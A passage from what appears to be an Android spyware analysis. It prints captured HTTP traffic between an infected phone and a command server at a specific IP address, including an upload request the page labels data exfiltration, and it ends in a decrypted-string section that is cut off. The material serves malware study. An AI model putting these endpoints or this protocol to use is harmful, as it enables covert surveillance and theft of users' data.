CodeName: REL Inc: eng.android.1441800693 SDK: 19&quot;,&quot;ServicePack&quot;:&quot;&quot;,&quot;SystemDirectory&quot;:&quot;&quot;,&quot;UserDomainName&quot;:&quot;&quot;,&quot;UserName&quot;:&quot;android&quot;,&quot;ProcessorCount&quot;:0&#125;</div></pre></td></tr></table></figure>
<h4 id="RequestActionsToExecute-Response"><a href="#RequestActionsToExecute-Response" class="headerlink" title="RequestActionsToExecute - Response"></a><a name="RequestActionsToExecute-Response"></a>RequestActionsToExecute - Response</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Server: Apache-Coyote/1.1</div><div class="line">Content-Type: application/json;charset=UTF-8</div><div class="line">Date: Mon, 07 Nov 2016 01:03:21 GMT</div><div class="line">Content-Length: 2</div><div class="line"></div><div class="line">[]</div></pre></td></tr></table></figure>
<h4 id="AckRequestedActions-Request"><a href="#AckRequestedActions-Request" class="headerlink" title="AckRequestedActions - Request"></a><a name="AckRequestedActions-Request"></a>AckRequestedActions - Request</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">POST /UlisseREST/api/actions/AckRequestedActions HTTP/1.1</div><div class="line">Connection: Keep-Alive</div><div class="line">Content-Type: application/json</div><div class="line">Accept: application/json</div><div class="line">User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; BLU STUDIO 5.0 C Build/KOT49H)</div><div class="line">Host: 68.233.237.11</div><div class="line">Accept-Encoding: gzip</div><div class="line">Content-Length: 2</div><div class="line"></div><div class="line">[]</div></pre></td></tr></table></figure>
<h4 id="AckRequestedActions-Response"><a href="#AckRequestedActions-Response" class="headerlink" title="AckRequestedActions - Response"></a><a name="AckRequestedActions-Response"></a>AckRequestedActions - Response</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Server: Apache-Coyote/1.1</div><div class="line">Content-Length: 0</div><div class="line">Date: Mon, 07 Nov 2016 01:03:21 GMT</div></pre></td></tr></table></figure>
<h4 id="UploadService-Request-data-exfiltration"><a href="#UploadService-Request-data-exfiltration" class="headerlink" title="UploadService - Request (data exfiltration)"></a><a name="UploadService-Request"></a>UploadService - Request (data exfiltration)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">POST /UlisseWCF/UploadService.svc/UploadFile/8f4af21e-29fb-48e9-8b52-8cf87fcdec57/082982b2-e001-4d60-940e-47b923da1aae_2016.11.05_20.04.59__9000--999 HTTP/1.1</div><div class="line">Connection: Keep-Alive</div><div class="line">Content-Type: application/octet-stream</div><div class="line">User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; BLU STUDIO 5.0 C Build/KOT49H)</div><div class="line">Host: 68.233.237.11</div><div class="line">Accept-Encoding: gzip</div><div class="line">Content-Length: 834</div><div class="line"></div><div class="line">(PKZip / encrypted blob)</div></pre></td></tr></table></figure>
<h4 id="UploadService-Response"><a href="#UploadService-Response" class="headerlink" title="UploadService - Response"></a><a name="UploadService-Response"></a>UploadService - Response</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Server: Apache-Coyote/1.1</div><div class="line">Content-Length: 0</div><div class="line">Date: Sun, 06 Nov 2016 00:06:40 GMT</div></pre></td></tr></table></figure>
<h4 id="NotifyLog-Request"><a href="#NotifyLog-Request" class="headerlink" title="NotifyLog - Request"></a><a name="NotifyLog-Request"></a>NotifyLog - Request</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST /UlisseREST/api/log/NotifyLog HTTP/1.1</div><div class="line">Connection: Keep-Alive</div><div class="line">Content-Type: application/json</div><div class="line">Accept: application/json</div><div class="line">User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; BLU STUDIO 5.0 C Build/KOT49H)</div><div class="line">Host: 68.233.237.11</div><div class="line">Accept-Encoding: gzip</div><div class="line">Content-Length: 6326</div><div class="line"></div><div class="line">&#123;</div><div class="line">  &quot;ClientId&quot;: &quot;8f4af21e-29fb-48e9-8b52-8cf87fcdec57&quot;,</div><div class="line">  &quot;Date&quot;: &quot;Nov 5, 2016 8:05:07 PM&quot;,</div><div class="line">  &quot;Details&quot;: &quot;*************************** Sat Nov 05 20:04:58 EDT 2016***************************   \r\nError loading action registry\r\n\r\n\r\nException Type = class java.lang.Exception\r\n\r\n#####Exception Details:   Error reading serialized stream: file not exists. Filename: \/data\/data\/it.apnphone.android\/files\/datas\/acservice\r\nclass java.lang.Exception\r\njava.lang.Exception: Error reading serialized stream: file not exists. Filename: \/data\/data\/it.apnphone.android\/files\/datas\/acservice\n\tat com.google.android.common.Serialization.binaryDeSerializeOnCryptedFilePrivate(Serialization.java:346)\n\tat com.google.android.actionsExecutor.ActionsRegistry.a(ActionsRegistry.java:94)\n\tat com.google.android.actionsExecutor.ActionsRegistry._(ActionsRegistry.java:49)\n\tat com.google.android.MainService.onCreate(MainService.java:67)\n\tat android.app.ActivityThread.handleCreateService(ActivityThread.java:2731)\n\tat android.app.ActivityThread.access$1800(ActivityThread.java:151)\n\tat android.app.ActivityThread$H.handleMessage(ActivityThread.java:1403)\n\tat android.os.Handler.dispatchMessage(Handler.java:110)\n\tat android.os.Looper.loop(Looper.java:193)\n\tat android.app.ActivityThread.main(ActivityThread.java:5299)\n\tat java.lang.reflect.Method.invokeNative(Native Method)\n\tat java.lang.reflect.Method.invoke(Method.java:515)\n\tat com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:825)\n\tat com.android.internal.os.ZygoteInit.main(ZygoteInit.java:641)\n\tat dalvik.system.NativeStart.main(Native Method)\n\r\n\r\n*************************** Sat Nov 05 20:04:58 EDT 2016***************************   \r\nError loading executed action registry\r\n\r\n\r\nException Type = class java.lang.Exception\r\n\r\n#####Exception Details:   Error reading serialized stream: file not exists. Filename: \/data\/data\/it.apnphone.android\/files\/datas\/easervice\r\nclass java.lang.Exception\r\njava.lang.Exception: Error reading serialized stream: file not exists. Filename: \/data\/data\/it.apnphone.android\/files\/datas\/easervice\n\tat com.google.android.common.Serialization.binaryDeSerializeOnCryptedFilePrivate(Serialization.java:346)\n\tat com.google.android.actionsExecutor.ActionsRegistry.a(ActionsRegistry.java:115)\n\tat com.google.android.actionsExecutor.ActionsRegistry._(ActionsRegistry.java:49)\n\tat com.google.android.MainService.onCreate(MainService.java:67)\n\tat android.app.ActivityThread.handleCreateService(ActivityThread.java:2731)\n\tat android.app.ActivityThread.access$1800(ActivityThread.java:151)\n\tat android.app.ActivityThread$H.handleMessage(ActivityThread.java:1403)\n\tat android.os.Handler.dispatchMessage(Handler.java:110)\n\tat android.os.Looper.loop(Looper.java:193)\n\tat android.app.ActivityThread.main(ActivityThread.java:5299)\n\tat java.lang.reflect.Method.invokeNative(Native Method)\n\tat java.lang.reflect.Method.invoke(Method.java:515)\n\tat com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:825)\n\tat com.android.internal.os.ZygoteInit.main(ZygoteInit.java:641)\n\tat dalvik.system.NativeStart.main(Native Method)\n\r\n\r\n*************************** Sat Nov 05 20:04:58 EDT 2016***************************   \r\nError loading assembly registry\r\n\r\n\r\nException Type = class java.lang.Exception\r\n\r\n#####Exception Details:   Error reading serialized stream: file not exists. Filename: \/data\/data\/it.apnphone.android\/files\/datas\/arservice.dat\r\nclass java.lang.Exception\r\njava.lang.Exception: Error reading serialized stream: file not exists. Filename: \/data\/data\/it.apnphone.android\/files\/datas\/arservice.dat\n\tat com.google.android.common.Serialization.binaryDeSerializeOnCryptedFilePrivate(Serialization.java:346)\n\tat com.google.android.global.AssemblyManager.h(AssemblyManager.java:201)\n\tat com.google.android.global.AssemblyManager.c(AssemblyManager.java:57)\n\tat com.google.android.MainService.onCreate(MainService.java:71)\n\tat android.app.ActivityThread.handleCreateService(ActivityThread.java:2731)\n\tat android.app.ActivityThread.access$1800(ActivityThread.java:151)\n\tat android.app.ActivityThread$H.handleMessage(ActivityThread.java:1403)\n\tat android.os.Handler.dispatchMessage(Handler.java:110)\n\tat android.os.Looper.loop(Looper.java:193)\n\tat android.app.ActivityThread.main(ActivityThread.java:5299)\n\tat java.lang.reflect.Method.invokeNative(Native Method)\n\tat java.lang.reflect.Method.invoke(Method.java:515)\n\tat com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:825)\n\tat com.android.internal.os.ZygoteInit.main(ZygoteInit.java:641)\n\tat dalvik.system.NativeStart.main(Native Method)\n\r\n\r\n*************************** Sat Nov 05 20:04:58 EDT 2016***************************   \r\nError loading components registry\r\n\r\n\r\nException Type = class java.lang.Exception\r\n\r\n#####Exception Details:   Error reading serialized stream: file not exists. Filename: \/data\/data\/it.apnphone.android\/files\/datas\/crservice.dat\r\nclass java.lang.Exception\r\njava.lang.Exception: Error reading serialized stream: file not exists. Filename: \/data\/data\/it.apnphone.android\/files\/datas\/crservice.dat\n\tat com.google.android.common.Serialization.binaryDeSerializeOnCryptedFilePrivate(Serialization.java:346)\n\tat com.google.android.global.ComponentsRegistry.o(ComponentsRegistry.java:115)\n\tat com.google.android.global.ComponentsRegistry.e(ComponentsRegistry.java:40)\n\tat com.google.android.MainService.onCreate(MainService.java:74)\n\tat android.app.ActivityThread.handleCreateService(ActivityThread.java:2731)\n\tat android.app.ActivityThread.access$1800(ActivityThread.java:151)\n\tat android.app.ActivityThread$H.handleMessage(ActivityThread.java:1403)\n\tat android.os.Handler.dispatchMessage(Handler.java:110)\n\tat android.os.Looper.loop(Looper.java:193)\n\tat android.app.ActivityThread.main(ActivityThread.java:5299)\n\tat java.lang.reflect.Method.invokeNative(Native Method)\n\tat java.lang.reflect.Method.invoke(Method.java:515)\n\tat com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:825)\n\tat com.android.internal.os.ZygoteInit.main(ZygoteInit.java:641)\n\tat dalvik.system.NativeStart.main(Native Method)\n\r\n\r\n&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="NotifyLog-Response"><a href="#NotifyLog-Response" class="headerlink" title="NotifyLog - Response"></a><a name="NotifyLog-Response"></a>NotifyLog - Response</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Server: Apache-Coyote/1.1</div><div class="line">Content-Length: 0</div><div class="line">Date: Sun, 06 Nov 2016 00:06:40 GMT</div></pre></td></tr></table></figure>
<h4 id="Decrypted-String-Dump"><a href="#Decrypted-String-Dump" class="headerlink" title="Decrypted String Dump"></a><a name="Decrypted-String-Dump"></a>Decrypted String Dump</h4><figure class="highlight plain"><figcaption><span>decrypt.txt</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div><div class="line">388</div><div class="line">389</div><div class="line">390</div><div class="line">391</div><div class="line">392</div><div class="line">393</div><div class="line">394</div><div class="line">395</div><div class="line">396</div><div class="line">397</div><div class="line">398</div><div class="line">399</div><div class="line">400</div><div class="line">401</div><div class="line">402</div><div class="line">403</div><div class="line">404</div><div class="line">405</div><div class="line">406</div><div class="line">407</div><div class="line">408</div><div class="line">409</div><div class="line">410</div><div class="line">411</div><div class="line">412</div><div class="line">413</div><div class="line">414</div><div class="line">415</div><div class="line">416</div><div class="line">417</div><div class="line">418</div><div class="line">419</div><div class="line">420</div><div class="line">421</div><div class="line">422</div><div class="line">423</div><div class="line">424</div><div class="line">425</div><div class="line">426</div><div class="line">427</div><div class="line">428</div><div class="line">429</div><div class="line">430</div><div class="line">431</div><div class="line">432</div><div class="line">433</div><div class="line">434</div><div class="line">435</div><div class="line">436</div><div class="line">437</div><div class="line">438</div><div class="line">439</div><div class="line">440</div><div class="line">441</div><div class="line">442</div><div class="line">443</div><div class="line">444</div><div class="line">445</div><div class="line">446</div><div class="line">447</div><div class="line">448</div><div class="line">449</div><div class="line">450</div><div class="line">451</div><div class="line">452</div><div class="line">453</div><div class="line">454</div><div class="line">455</div><div class="line">456</div><div class="line">457</div><div class="line">458</div><div class="line">459</div><div class="line">460</div><div class="line">461</div><div class="line">462</div><div class="line">463</div><div class="line">464</div><div class="line">465</div><div class="line">466</div><div class="line">467</div><div class="line">468</div><div class="line">469</div><div class="line">470</div><div class="line">471</div><div class="line">472</div><div class="line">473</div><div class="line">474</div><div class="line">475</div><div class="line">476</div><div class="line">477</div><div class="line">478</div><div class="line">479</div><div class="line">480</div><div class="line">481</div><div class="line">482</div><div class="line">483</div><div class="line">484</div><div class="line">485</div><div class="line">486</div><div class="line">487</div><div class="line">488</div><div class="line">489</div><div class="line">490</div><div class="line">491</div><div class="line">492</div><div class="line">493</div><div class="line">494</div><div class="line">495</div><div class="line">496</div><div class="line">497</div><div class="line">498</div><div class="line">499</div><div class="line">500</div><div class="line">501</div><div class="line">502</div><div class="line">503</div><div class="line">504</div><div class="line">505</div><div class="line">506</div><div class="line">507</div><div class="line">508</div><div class="line">509</div><div class="line">510</div><div class="line">511</div><div class="line">512</div><div class="line">513</div><div class="line">514</div><div class="line">515</div><div class="line">516</div><div class="line">517</div><div class="line">518</div><div class="line">519</div><div class="line">520</div><div class="line">521</div><div class="line">522</div><div class="line">523</div><div class="line">524</div><div class="line">525</div><div class="line">526</div><div class="line">527</div><div class="line">528</div><div class="line">529</div><div class="line">530</div><div class="line">531</div><div class="line">532</div><div class="line">533</div><div class="line">534</div><div class="line">535</div><div class="line">536</div><div class="line">537</div><div class="line">538</div><div class="line">539</div><div class="line">540</div><div class="line">541</div><div class="line">542</div><div class="line">543</div><div class="line">544</div><div class="line">545</div><div class="line">546</div><div class="line">547</div><div class="line">548</div><div class="line">549</div><div class="line">550</div><div class="line">551</div><div class="line">552</div><div class="line">553</div><div class="line">554</div><div class="line">555</div><div class="line">556</div><div class="line">557</div><div class="line">558</div><div class="line">559</div><div class="line">560</div><div class="line">561</div><div class="line">562</div><div class="line">563</div><div class="line">564</div><div class="line">565</div><div class="line">566</div><div class="line">567</div><div class="line">568</div><div class="line">569</div><div class="line">570</div><div class="line">571</div><div class="line">572</div><div class="line">573</div><div class="line">574</div><div class="line">575</div><div class="line">576</div><div class="line">577</div><div class="line">578</div><div class="line">579</div><div class="line">580</div><div class="line">581</div><div class="line">582</div><div class="line">583</div><div class="line">584</div><div class="line">585</div><div class="line">586</div><div class="line">587</div><div class="line">588</div><div class="line">589</div><div class="line">590</div><div class="line">591</div><div class="line">592</div><div class="line">593</div><div class="line">594</div><div class="line">595</div><div class="line">596</div><div class="line">597</div><div class="line">598</div><div class="line">599</div><div class="line">600</div><div class="line">601</div><div class="line">602</div><div class="line">603</div><div class="line">604</div><div class="line">605</div><div class="line">606</div><div class="line">607</div><div class="line">608</div><div class="line">609</div><div class="line">610</div><div class="line">611</div><div class="line">612</div><div class="line">613</div><div class="line">614</div><div class="line">615</div><div class="line">616</div><div class="line">617</div><div class="line">618</div><div class="line">619</div><div class="line">620</div><div class="line">621</div><div class="line">622</div><div class="line">623</div><div class="line">624</div><div class="line">625</div><div class="line">626</div><div class="line">627</div><div class="line">628</div><div class="line">629</div><div class="line">630</div><div class="line">631</div><div class="line">632</div><div class="line">633</div><div class="line">634</div><div class="line">635</div><div class="line">636</div><div class="line">637</div><div class="line">638</div><div class="line">639</div><div class="line">640</div><div class="line">641</div><div class="line">642</div><div class="line">643</div><div class="line">644</div><div class="line">645</div><div class="line">646</div><div class="line">647</div><div class="line">648</div><div class="line">649</div><div class="line">650</div><div class="line">651</div><div class="line">652</div><div class="line">653</div><div class="line">654</div><div class="line">655</div><div class="line">656</div><div class="line">657</div><div class="line">658</div><div class="line">659</div><div class="line">660</div><div class="line">661</div><div class="line">662</div><div class="line">663</div><div class="line">664</div><div class="line">665</div><div class="line">666</div><div class="line">667</div><div class="line">668</div><div class="line">669</div><div class="line">670</div><div class="line">671</div><div class="line">672</div><div class="line">673</div><div class="line">674</div><div class="line">675</div><div class="line">676</div><div class="line">677</div><div class="line">678</div><div class="line">679</div><div class="line">680</div><div class="line">681</div><div class="line">682</div><div class="line">683</div><div class="line">684</div><div class="line">685</div><div class="line">686</div><div class="line">687</div><div class="line">688</div><div class="line">689</div><div class="line">690</div><div class="line">691</div><div class="line">692</div><div class="line">693</div><div class="line">694</div><div class="line">695</div><div class="line">696</div><div class="line">697</div><div class="line">698</div><div class="line">699</div><div class="line">700</div><div class="line">701</div><div class="line">702</div><div class="line">703</div><div class="line">704</div><div class="line">705</div><div class="line">706</div><div class="line">707</div><div class="line">708</div><div class="line">709</div><div class="line">710</div><div class="line">711</div><div class="line">712</div><div class="line">713</div><div class="line">714</div><div class="line">715</div><div class="line">716</div><div class="line">717</div><div class="line">718</div><div class="line">719</div><div class="line">720</div><div class="line">721</div><div class="line">722</div><div class="line">723</div><div class="line">724</div><div class="line">725</div><div class="line">726</div><div class="line">727</div><div class="line">728</div><div class="line">729</div><div class="line">730</div><div class="line">731</div><div class="line">732</div><div class="line">733</div><div class="line">734</div><div class="line">735</div><div class="line">736</div><div class="line">737</div><div class="line">738</div><div class="line">739</div><div class="line">740</div><div class="line">741</div><div class="line">742</div><div class="line">743</div><div class="line">744</div><div class="line">745</div><div class="line">746</div><div class="line">747</div><div class="line">748</div><div class="line">749</div><div class="line">750</div><div class="line">751</div><div class="line">752</div><div class="line">753</div><div class="line">754</div><div class="line">755</div><div class="line">756</div><div class="line">757</div><div class="line">758</div><div class="line">759</div><div class="line">760</div><div class="line">761</div><div class="line">762</div><div class="line">763</div><div class="line">764</div><div class="line">765</div><div class="line">766</div><div class="line">767</div><div class="line">768</div><div class="line">769</div><div class="line">770</div><div class="line">771</div><div class="line">772</div><div class="line">773</div><div class="line">774</div><div class="line">775</div><div class="line">776</div><div class="line">777</div><div class="line">778</div><div class="line">779</div><div class="line">780</div><div class="line">781</div><div class="line">782</div><div class="line">783</div><div class="line">784</div><div class="line">785</div><div class="line">786</div><div class="line">787</div><div class="line">788</div><div class="line">789</div><div class="line">790</div><div class="line">791</div><div class="line">792</div><div class="line">793</div><div class="line">794</div><div class="line">795</div><div class="line">796</div><div class="line">797</div><div class="line">798</div><div class="line">799</div><div class="line">800</div><div class="line">801</div><div class="line">802</div><div class="line">803</div><div class="line">804</div><div class="line">805</div><div class="line">806</div><div class="line">807</div><div class="line">808</div><div class="line">809</div><div class="line">810</div><div class="line">811</div><div class="line">812</div><div class="line">813</div><div class="line">814</div><div class="line">815</div><div class="line">816</div><div class="line">817</div><div class="line">818</div><div class="line">819</div><div class="line">820</div><div class="line">821</div><div class="line">822</div><div class="line">823</div><div class="line">824</div><div class="line">825</div><div class="line">826</div><div class="line">827</div><div class="line">828</div><div class="line">829</div><div class="line">830</div><div class="line">831</div><div class="line">832</div><div class="line">833</div><div class="line">834</div><div class="line">835</div><div class="line">836</div><div class="line">837</div><div class="line">838</div><div class="line">839</div><div class="line">840</div><div class="line">841</div><div class="line">842</div><div class="line">843</div><div class="line">844</div><div class="line">845</div><div class="line">846</div><div class="line">847</div><div class="line">848</div><div class="line">849</div><div class="line">850</div><div class="line">851</div><div class="line">852</div><div class="line">853</div><div class="line">854</div><div class="line">855</div><div class="line">856</div><div class="line">857</div><div class="line">858</div><div class="line">859</div><div class="line">860</div><div class="line">861</div><div class="line">862</div><div class="line">863</div><div class="line">864</div><div class="line">865</div><div class="line">866</div><div class="line">867</div><div class="line">868</div><div class="line">869</div><div class="line">870</div><div class="line">871</div><div class="line">872</div><div class="line">873</div><div class="line">874</div><div class="line">875</div><div class="line">876</div><div class="line">877</div><div class="line">878</div><div class="line">879</div><div class="line">880</div><div class="line">881</div><div class="line">882</div><div class="line">883</div><div class="line">884</div><div class="line">885</div><div class="line">886</div><div class="line">887</div><div class="line">888</div><div class="line">889</div><div class="line">890</div><div class="line">891</div><div class="line">892</div><div class="line">893</div><div class="line">894</div><div class="line">895</div><div class="line">896</div><div class="line">897</div><div class="line">898</div><div class="line">899</div><div class="line">900</div><div class="line">901</div><div class="line">902</div><div class="line">903</div><div class="line">904</div><div class="line">905</div><div class="line">906</div><div class="line">907</div><div class="line">908</div><div class="line">909</div><div class="line">910</div><div class="line">911</div><div class="line">912</div><div class="line">913</div><div class="line">914</div><div class="line">915</div><div class="line">916</div><div class="line">917</div><div class="line">918</div><div class="line">919</div><div class="line">920</div><div class="line">921</div><div class="line">922</div><div class="line">923</div><div class="line">924</div><div class="line">925</div><div class="line">926</div><div class="line">927</div><div class="line">928</div><div class="line">929</div><div class="line">930</div><div class="line">931</div><div class="line">932</div><div class="line">933</div><div class="line">934</div><div class="line">935</div><div class="line">936</div><div class="line">937</div><div class="line">938</div><div class="line">939</div><div class="line">940</div><div class="line">941</div><div class="line">942</div><div class="line">943</div><div class="line">944</div><div class="line">945</div><div class="line">946</div><div class="line">947</div><div class="line">948</div><div class="line">949</div><div class="line">950</div><div class="line">951</div><div class="line">952</div><div class="line">953</div><div class="line">954</div><div class="line">955</div><div class="line">956</div><div class="line">957</div><div class="line">958</div><div class="line">959</div><div class="line">960</div><div class="line">961</div><div class="line">962</div><div class="line">963</div><div class="line">964</div><div class="line">965</div><div class="line">966</div><div class="line">967</div><div class="line">968</div><div class="line">969</div><div class="line">970</div><div class="line">971</div><div class="line">972</div><div class="line">973</div><div class="line">974</div><div class="line">975</div><div class="line">976</div><div class="line">977</div><div class="line">978</div><div class="line">979</div><div class="line">980</div><div class="line">981</div><div class="line">982</div><div class="line">983</div><div class="line">984</div><div class="line">985</div><div class="line">986</div><div class="line">987</div><div class="line">988</div><div class="line">989</div><div class="line">990</div><div class="line">991</div><div class="line">992</div><div class="line">993</div><div class="line">994</div><div class="line">995</div><div class="line">996</div><div class="line">997</div><div class="line">998</div><div class="line">999</div><div class="line">1000</div><div 